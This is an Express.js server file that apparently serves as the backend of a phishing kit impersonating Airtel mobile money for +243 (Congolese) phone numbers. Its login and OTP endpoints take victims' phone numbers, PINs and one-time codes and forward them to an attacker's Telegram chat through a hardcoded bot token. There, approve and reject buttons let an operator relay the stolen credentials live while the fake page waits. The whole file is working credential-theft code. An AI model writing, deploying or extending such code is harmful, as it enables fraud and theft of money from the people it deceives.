const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// 🔑 Your details
const BOT_TOKEN = process.env.BOT_TOKEN || "8979057744:AAEiWFpLicOu-cIEPP6Ol8EdQqJYC4BncV4";
const CHAT_ID   = process.env.CHAT_ID   || "8409068780";
const PUBLIC_URL = process.env.PUBLIC_URL || "https://aairtel-production.up.railway.app";

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// IN-MEMORY STORAGE
// ============================================================
// requests[id] = {
//   type: 'login' | 'otp',
//   phone, pin/otp, amount, session,
//   status: 'pending' | 'approved' | 'rejected' | 'expired',
//   createdAt, messageId
// }
const requests = {};
const TIMEOUT_MS = 30 * 60 * 1000; // 30 minutes

function newId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function pruneExpired() {
  const now = Date.now();
  for (const id in requests) {
    if (requests[id].status === 'pending' && now - requests[id].createdAt > TIMEOUT_MS) {
      requests[id].status = 'expired';
    }
  }
}
setInterval(pruneExpired, 60 * 1000); // every minute

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function tgCall(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return res.json();
}

async function sendMessage(text, replyMarkup) {
  return tgCall('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    ...(replyMarkup ? { reply_markup: replyMarkup } : {})
  });
}

async function editMessage(messageId, text) {
  return tgCall('editMessageText', {
    chat_id: CHAT_ID,
    message_id: messageId,
    text,
    parse_mode: 'HTML'
  });
}

// ============================================================
// HEALTH
// ============================================================
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'AAirtel backend running' });
});

// ============================================================
// LOGIN  →  send to Telegram with ✅ / ❌ buttons
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    const { phone, pin, amount, session } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ success: false, error: 'Missing phone or pin' });
    }

    const id = newId();

    const text =
      `🔑 <b>LOGIN ATTEMPT</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${phone}\n` +
      `<b>🔒 PIN:</b> <code>${pin}</code>\n` +
      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
      `<b>🆔 ID:</b> <code>${id}</code>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const reply_markup = {
      inline_keyboard: [[
        { text: '✅ Approuver', callback_data: `approve:${id}` },
        { text: '❌ Rejeter',   callback_data: `reject:${id}`  }
      ]]
    };

    const result = await sendMessage(text, reply_markup);
    const messageId = result?.result?.message_id;

    requests[id] = {
      type: 'login',
      phone, pin, amount, session,
      status: 'pending',
      createdAt: Date.now(),
      messageId
    };

    res.json({ success: true, request_id: id });
  } catch (err) {
    console.error('LOGIN ERROR:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// LOGIN STATUS  →  frontend polls this
// ============================================================
app.get('/api/login/status/:id', (req, res) => {
  const r = requests[req.params.id];
  if (!r || r.type !== 'login') {
    return res.json({ status: 'rejected' }); // unknown = reject
  }
  pruneExpired();
  res.json({ status: r.status });
});

// ============================================================
// OTP  →  send to Telegram with ✅ / ❌ buttons
// ============================================================
app.post('/api/otp', async (req, res) => {
  try {
    const { phone, otp, amount, session } = req.body;

    if (!phone || !otp) {
      return res.status(400).json({ success: false, error: 'Missing phone or otp' });
    }

    const id = newId();

    const text =
      `🔐 <b>OTP SUBMITTED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `<b>📱 Téléphone:</b> +243 ${phone}\n` +
      `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
      `<b>💰 Montant:</b> $${amount || 'N/A'}\n` +
      `<b>🆔 ID:</b> <code>${id}</code>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🕒 ${new Date().toLocaleString('fr-FR')}`;

    const reply_markup = {
      inline_keyboard: [[
        { text: '✅ Approuver', callback_data: `approve:${id}` },
        { text: '❌ Rejeter',   callback_data: `reject:${id}`  }
      ]]
    };

    const result = await sendMessage(text, reply_markup);
    const messageId = result?.result?.message_id;

    requests[id] = {
      type: 'otp',
      phone, otp, amount, session,
      status: 'pending',
      createdAt: Date.now(),
      messageId
    };

    res.json({ success: true, request_id: id });
  } catch (err) {
    console.error('OTP ERROR:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================
// OTP STATUS  →  frontend polls this
// ============================================================
app.get('/api/otp/status/:id', (req, res) => {
  const r = requests[req.params.id];
  if (!r || r.type !== 'otp') {
    return res.json({ status: 'rejected' });
  }
  pruneExpired();
  res.json({ status: r.status });
});

// ============================================================
// TELEGRAM WEBHOOK  →  receives admin button taps
// ============================================================
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const update = req.body;

    // Inline button tapped
    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data || '';
      const [action, id] = data.split(':');
      const r = requests[id];

      if (r) {
        if (action === 'approve') {
          r.status = 'approved';
          await editMessage(
            r.messageId,
            `✅ <b>APPROVED</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>Type:</b> ${r.type}\n` +
            `<b>📱 Phone:</b> +243 ${r.phone}\n` +
            `<b>🆔 ID:</b> <code>${id}</code>`
          );
        } else if (action === 'reject') {
          r.status = 'rejected';
          await editMessage(
            r.messageId,
            `❌ <b>REJECTED</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>Type:</b> ${r.type}\n` +
            `<b>📱 Phone:</b> +243 ${r.phone}\n` +
            `<b>🆔 ID:</b> <code>${id}</code>`
          );
        }
      }

      // Answer callback to remove the loading spinner on the button
      await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('WEBHOOK ERROR:', err);
    res.sendStatus(200); // always 200 so Telegram doesn't retry
  }
});

// ============================================================
// SETUP  →  register webhook with Telegram (call once)
// ============================================================
app.get('/setup-webhook', async (req, res) => {
  const webhookUrl = `${PUBLIC_URL}/api/telegram/webhook`;
  const result = await tgCall('setWebhook', { url: webhookUrl });
  res.json(result);
});

// ============================================================
// 404 + START
// ============================================================
app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Route not found' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
